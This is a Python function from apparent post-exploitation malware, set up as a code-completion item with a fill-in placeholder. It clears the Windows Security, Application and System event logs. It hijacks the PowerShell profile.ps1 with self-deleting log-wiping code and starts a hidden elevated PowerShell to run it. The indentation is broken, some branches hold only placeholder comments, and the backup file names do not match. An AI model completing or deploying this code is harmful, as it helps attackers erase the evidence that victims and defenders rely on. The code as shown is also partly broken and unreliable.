def clearev():
	tryy=get_output('powershell -c "Clear-EventLog \"Security\"" ')
	if not "not allowed." in tryy:
		# Use the powershell - c "Clear EventLog" Security "command to clear the security event log. If there are no permission restrictions, continue clearing the application and system event logs.
        # code
    else:
		##The second way :D
		code   = 'Clear-EventLog "Security"\n'
		code  += 'Clear-EventLog "Application"\n'
		code  += 'Clear-EventLog "System"\n'
		code  += "\nfunction SelfDestruct() {"+"\n"
		code  += "$path = (Get-Variable MyInvocation -Scope 1).Value.MyCommand.Path"+"\n"
		code  += "Clear-Content $path"+"\n"
		code  += "Remove-Item $path}"+"\n"
		code  += "SelfDestruct"+"\n"
		code  += '\nif( (Test-Path "Profile-Backup.ps1") ){'
		code  += "\n$content=Get-Content \"Profile-Backup.ps1\""
		code  += "\nSet-Content -Path \"profile.ps1\" -Value $content "
		code  += "\nRemove-Item \"Profile-Backup.ps1\"}"
		pth   = get_output( 'powershell -c "echo $PsHome"' ).strip()
		chpro = get_output( "IF EXIST {} (echo true)".format(pth+"\\profile.ps1") ).strip()
		if chpro != "true":
			try:
				f = open( pth+"\\profile.ps1" , "w" )
				f.write(code)
				f.close()
			except:
				pass #not enough permissions to create!
			else:
				x=subprocess.Popen( 'powershell -c "Start-Process powershell -Verb runAs -WindowStyle Hidden" >> NUL',shell=True)
		else:
			try:
				old = open( pth+"\\profile.ps1" , "r" )
				backup = old.read()
				old.close()
				backupfile = open( pth+"\\Profile-Backup" , "w" )
				backupfile.write(backup)
				backupfile.close()
				f = open( pth+"\\profile.ps1" , "w" )
				f.write(code)
				f.close()
			except:
				pass #not enough permissions to edit!
			else:
				# Using subprocess Popen starts a new PowerShell process and runs it with administrator privileges (- Verb runAs) and hidden window mode (- WindowStyle Hidden).
				# code
clea<FILL_HERE>